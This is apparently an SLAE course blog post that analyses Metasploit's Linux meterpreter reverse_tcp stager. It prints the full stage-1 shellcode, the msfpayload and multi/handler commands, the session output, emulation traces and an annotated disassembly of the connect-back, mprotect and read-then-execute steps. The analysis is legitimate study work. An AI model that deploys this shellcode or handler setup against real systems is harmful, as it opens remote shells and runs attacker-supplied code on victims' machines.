---
title:  "[SLAE 5] Metasploit meterpreter/reverse_tcp Shellcode"
categories: [SLAE]
---

![Logo](/assets/images/tux-root.png)

This post is part of the 5th assignment of the [SLAE course](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) and will analyse another Metasploit shellcode: **_meterpreter/reverse_tcp_**. First we'll check the description of this shellcode: 
```bash
# msfpayload linux/x86/meterpreter/reverse_tcp S
 
       Name: Linux Meterpreter, Reverse TCP Stager
     Module: payload/linux/x86/meterpreter/reverse_tcp
    Version: 0
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 178
       Rank: Normal
 
Provided by:
  PKS
  egypt <egypt@metasploit.com>
  skape <mmiller@hick.org>
 
Basic options:
Name          Current Setting  Required  Description
----          ---------------  --------  -----------
DebugOptions  0                no        Debugging options for POSIX meterpreter
LHOST                          yes       The listen address
LPORT         4444             yes       The listen port
PrependFork                    no        Add a fork() / exit_group() (for parent) code
 
Description:
  Connect back to the attacker, Staged meterpreter server
```

To test it, we'll insert the 1st stage payload into the skeleton tester file: 
```bash
# msfpayload linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 C
```

```c
/*
 * linux/x86/meterpreter/reverse_tcp - 71 bytes (stage 1)
 * http://www.metasploit.com
 * VERBOSE=false, LHOST=192.168.56.101, LPORT=4444, 
 * ReverseConnectRetries=5, ReverseAllowProxy=false, 
 * EnableStageEncoding=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, AutoLoadStdapi=true, 
 * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
 * EnableUnicodeEncoding=true, PrependFork=false, 
 * DebugOptions=0
 */
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
"\x97\x5b\x68\xc0\xa8\x38\x65\x68\x02\x00\x11\x5c\x89\xe1\x6a"
"\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
"\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
"\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1";
 
/*
 * linux/x86/meterpreter/reverse_tcp - 1126400 bytes (stage 2)
 * http://www.metasploit.com
 */
unsigned char buf[] = 
"\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x02\x00\x03\x00\x01\x00\x00\x00\x05\xfe\x04\x20\x34\x00"
[..]
```

We don't care about the 2nd stage because it will be transmitted to the client after connection. Then start a multi handler which will receive the connection and send the 2nd stage payload: 
```bash
msf exploit(handler) > show options 
 
Module options (exploit/multi/handler):
 
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
 
 
Payload options (linux/x86/meterpreter/reverse_tcp):
 
   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DebugOptions  0                no        Debugging options for POSIX meterpreter
   LHOST         192.168.56.101   yes       The listen address
   LPORT         4444             yes       The listen port
 
msf exploit(handler) > exploit -j -z
```

We send the compiled stage 1: 
```bash
$ ./shellcode
Shellcode Length:  24 bytes
(Shellcode contains null bytes)
```

And we get in the handler: 
```bash
msf exploit(handler) > 
[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
[*] Sending stage (1126400 bytes) to 192.168.56.1
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.1:33626) at 2013-07-21 21:21:08 +0100
 
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
 
meterpreter > getuid 
Server username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, sgid=1000
```

So the shellcode is working as expected. We proceed to analyse the payload with the shellcode tester from [libemu](https://www.aldeid.com/wiki/Libemu):
```bash
# msfpayload linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 R > shellcode.bin
# ls -al shellcode.bin 
-rwxrwx--- 1 root vboxsf 71 Jul 21 21:25 shellcode.bin
(71 bytes. It's stage 1)
$ cat shellcode.bin | /opt/libemu/bin/sctest -vvv -S -s 1000 -G shellcode.dot
```

And there's the first part of the shellcode that it was possible to be decoded by the emulator: 
```c
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int connect (
     int sockfd = 14;
     struct sockaddr_in * serv_addr = 0x00416fbe => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 1698212032 (host=192.168.56.101);
             };
             char sin_zero = "       ";
         };
     int addrlen = 102;
) =  0;
```

Here we see clearly the initial syscalls and their parameters. We can also view the same information graphically: 
```bash
$ dot shellcode.dot -T png -o shellcode.png
```

[![](/assets/images/libemu2-small.png)](/assets/images/libemu2.png)

Finally we'll manually analyse the shellcode to understand the complete functionality. To disassemble it: 
```bash
$ echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x97\x5b\x68\xc0\xa8\x38\x65\x68\x02\x00\x11\x5c\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1" | ndisasm -b 32 -
```

The first operation is, as we've seen previously, a socket call: 
```c
; man 2 socket
; int socket(int domain, int type, int protocol);
; Parameters can be viewed with strace commnad
; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
00000000  31DB              xor ebx,ebx         ; Zero out ebx
00000002  F7E3              mul ebx             ; Zero out eax
00000004  53                push ebx            ; Protocol - IPPROTO_IP (0) 
00000005  43                inc ebx             ; int call - SYS_SOCKET (1)
00000006  53                push ebx            ; Type - SOCK_STREAM (1)
00000007  6A02              push byte +0x2      ; Domain - AF_INET (2)
00000009  B066              mov al,0x66         ; sys_socketcall
0000000B  89E1              mov ecx,esp         ; Parameters
0000000D  CD80              int 0x80            ; Fire up the interrupt
```

Next is the connect call, which was also executed by the emulator: 
```c
; connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.56.101")}, 102)
0000000F  97                xchg eax,edi        ; fd is returned, then stored into edi
00000010  5B                pop ebx             ; ebx is 2
00000011  68C0A83865        push dword 0x6538a8c0
00000016  680200115C        push dword 0x5c110002
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66     ; sys_socketcall
0000001F  58                pop eax
00000020  50                push eax
00000021  51                push ecx
00000022  57                push edi            ; push first param - the fd
00000023  89E1              mov ecx,esp
00000025  43                inc ebx             ; int call - SYS_CONNECT (3)
00000026  CD80              int 0x80
```

Next operations were not executed by the emulator. Following is an _`mprotect`_ call, which sets protection on a region of memory. The function has the following syntax: 
```c
int mprotect(const void *addr, size_t len, int prot);
```

The parameters of the call can be easily viewed with the _`strace`_ utility:
```c
mprotect(0xbff7e000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
```

The defines have the following values:
```
PROT_READ 0x1 
PROT_WRITE 0x2 
PROT_EXEC 0x4 
```

And if we verify with the assembly code: 
```c
00000028  B207              mov dl,0x7          ; PROT_READ|PROT_WRITE|PROT_EXEC
0000002A  B900100000        mov ecx,0x1000      ; 4096
0000002F  89E3              mov ebx,esp
00000031  C1EB0C            shr ebx,0xc
00000034  C1E30C            shl ebx,0xc
00000037  B07D              mov al,0x7d         ; sys_mprotect
00000039  CD80              int 0x80
```

The final part of the shellcode is, as expected, the read call, which will get the 2nd stage payload from the server, and then execute it: 
```c
; man 2 read
; read - read from a file descriptor
; ssize_t read(int fd, void *buf, size_t count);
0000003B  5B                pop ebx             ; fd to read from; pushed at 'push edi' line
0000003C  89E1              mov ecx,esp         ; buffer
0000003E  99                cdq
0000003F  B60C              mov dh,0xc          ; count - a lot of data to be read...
00000041  B003              mov al,0x3          ; sys_read
00000043  CD80              int 0x80
00000045  FFE1              jmp ecx             ; the buffer thathas been read. execute it
```

##

The complete source files and scripts mentioned in this post can be found in my [SLAE Git repository](https://github.com/livz/slae).

**_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)_**
